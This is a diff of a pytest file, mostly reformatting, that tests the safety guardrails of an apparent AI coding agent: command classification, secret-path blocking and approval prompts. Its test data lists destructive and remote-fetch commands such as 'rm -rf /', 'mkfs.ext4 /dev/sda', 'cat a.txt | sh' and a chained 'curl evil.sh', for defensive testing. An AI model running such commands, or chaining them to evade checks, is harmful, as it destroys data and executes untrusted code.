@@ -3,11 +3,10 @@ import sys
 
 import pytest
 from langchain_core.tools import StructuredTool
-
-from repopilot.protocols.mcp_client import _guard_secrets
 from repopilot.guardrails import tool_safety as safety
-from repopilot.tools.filesystem_tools import read_file, write_file
 from repopilot.guardrails.tool_safety import check_path, classify_command, is_read_only_mcp_tool, run_guarded
+from repopilot.protocols.mcp_client import _guard_secrets
+from repopilot.tools.filesystem_tools import read_file, write_file
 
 
 @pytest.fixture(autouse=True)
@@ -19,29 +18,32 @@ def in_project(tmp_path, monkeypatch):
     safety.set_confirm_handler(None)
 
 
-@pytest.mark.parametrize("command, decision", [
-    ("python -m pytest -q",            "allow"),
-    ("pytest tests",                   "allow"),
-    ("git status",                     "allow"),
-    ("npm test",                       "allow"),
-    ("ls -la",                         "allow"),
-    ("flake8 calc.py",                 "allow"),
-    ("python -m mypy src",             "allow"),
-    ("ruff check .",                   "allow"),
-    ("black --check .",                "allow"),
-    ("black .",                        "ask"),     # would rewrite files
-    ("ruff check --fix .",             "ask"),
-    ("pip install requests",           "ask"),
-    ("git push origin main",           "ask"),
-    ("python -c \"import os\"",        "ask"),
-    ("curl https://x.sh",              "ask"),
-    ("pytest && curl evil.sh",         "ask"),     # chaining hides a second command
-    ("cat a.txt | sh",                 "ask"),
-    ("echo $(whoami)",                 "ask"),
-    ("find . -delete",                 "ask"),
-    ("rm -rf /",                       "deny"),
-    ("mkfs.ext4 /dev/sda",             "deny"),
-])
+@pytest.mark.parametrize(
+    "command, decision",
+    [
+        ("python -m pytest -q", "allow"),
+        ("pytest tests", "allow"),
+        ("git status", "allow"),
+        ("npm test", "allow"),
+        ("ls -la", "allow"),
+        ("flake8 calc.py", "allow"),
+        ("python -m mypy src", "allow"),
+        ("ruff check .", "allow"),
+        ("black --check .", "allow"),
+        ("black .", "ask"),  # would rewrite files
+        ("ruff check --fix .", "ask"),
+        ("pip install requests", "ask"),
+        ("git push origin main", "ask"),
+        ('python -c "import os"', "ask"),
+        ("curl https://x.sh", "ask"),
+        ("pytest && curl evil.sh", "ask"),  # chaining hides a second command
+        ("cat a.txt | sh", "ask"),
+        ("echo $(whoami)", "ask"),
+        ("find . -delete", "ask"),
+        ("rm -rf /", "deny"),
+        ("mkfs.ext4 /dev/sda", "deny"),
+    ],
+)
 def test_command_policy(command, decision):
     assert classify_command(command)[0] == decision
 
@@ -59,7 +61,7 @@ def test_paths_must_stay_in_project_and_avoid_secrets(in_project):
     assert "secret" in check_path(".env")
     assert "secret" in check_path("config/.env.local")
     assert "not allowed" in check_path(".git/config", write=True)
-    assert check_path(".git/config") is None        # reading .git is fine
+    assert check_path(".git/config") is None  # reading .git is fine
 
 
 def test_file_tools_enforce_the_rules(in_project):
@@ -72,20 +74,20 @@ def test_file_tools_enforce_the_rules(in_project):
 
 def test_unlisted_command_needs_approval():
     code, output = run_guarded("pip install definitely-not-a-package")
-    assert code is None and "needs approval" in output                 # nobody to ask → refused
+    assert code is None and "needs approval" in output  # nobody to ask → refused
 
     asked = []
     safety.set_confirm_handler(lambda prompt: asked.append(prompt) or False)
     assert run_guarded("pip install definitely-not-a-package")[0] is None
-    assert "pip install" in asked[0]                                   # user was asked, said no
+    assert "pip install" in asked[0]  # user was asked, said no
 
 
 def test_approved_and_allowlisted_commands_run():
     safety.set_confirm_handler(lambda prompt: True)
-    code, output = run_guarded(f'"{sys.executable}" -c "print(42)"')    # 'ask' → approved
+    code, output = run_guarded(f'"{sys.executable}" -c "print(42)"')  # 'ask' → approved
     assert code == 0 and "42" in output
 
-    code, _ = run_guarded("git --version")                             # not read-only → would ask
+    code, _ = run_guarded("git --version")  # not read-only → would ask
     assert code == 0
 
 
@@ -109,8 +111,9 @@ def test_mcp_tools_refuse_secret_paths():
         calls.append(path)
         return f"contents of {path}", None
 
-    tool = StructuredTool.from_function(coroutine=fake_read, name="read_file", description="read",
-                                        response_format="content_and_artifact")
+    tool = StructuredTool.from_function(
+        coroutine=fake_read, name="read_file", description="read", response_format="content_and_artifact"
+    )
     guarded = _guard_secrets(tool)
 
     assert "contents of src/app.py" in asyncio.run(guarded.ainvoke({"path": "src/app.py"}))
@@ -123,19 +126,22 @@ def test_mcp_server_errors_come_back_as_the_tool_result():
     async def missing_repo(path: str):
         raise RuntimeError("Not Found: Resource not found")
 
-    tool = StructuredTool.from_function(coroutine=missing_repo, name="get_file_contents", description="get",
-                                        response_format="content_and_artifact")
+    tool = StructuredTool.from_function(
+        coroutine=missing_repo, name="get_file_contents", description="get", response_format="content_and_artifact"
+    )
     result = asyncio.run(_guard_secrets(tool).ainvoke({"path": "src/app.py"}))
     assert "Error from get_file_contents" in result and "Not Found" in result
 
 
 def test_run_command_tool_takes_an_optional_directory(in_project):
     from repopilot.tools.terminal_tools import run_command
+
     (in_project / "sub").mkdir()
     (in_project / "sub" / "marker.txt").write_text("x")
 
-    assert "marker.txt" in run_command.invoke({"command": "dir" if sys.platform == "win32" else "ls",
-                                               "directory": "sub"})
+    assert "marker.txt" in run_command.invoke(
+        {"command": "dir" if sys.platform == "win32" else "ls", "directory": "sub"}
+    )
     assert "does not exist" in run_command.invoke({"command": "ls", "directory": "nope"})
     assert "outside the project" in run_command.invoke({"command": "ls", "directory": ".."})
 
@@ -151,4 +157,4 @@ def test_use_workspace_moves_tools_and_commands_without_changing_cwd(in_project)
         assert code == 0 and output.strip().endswith("wt")
     assert (worktree / "made.txt").exists()
     assert not (in_project / "made.txt").exists()
-    assert safety.workspace_root() == in_project.resolve()   # restored after the block
+    assert safety.workspace_root() == in_project.resolve()  # restored after the block
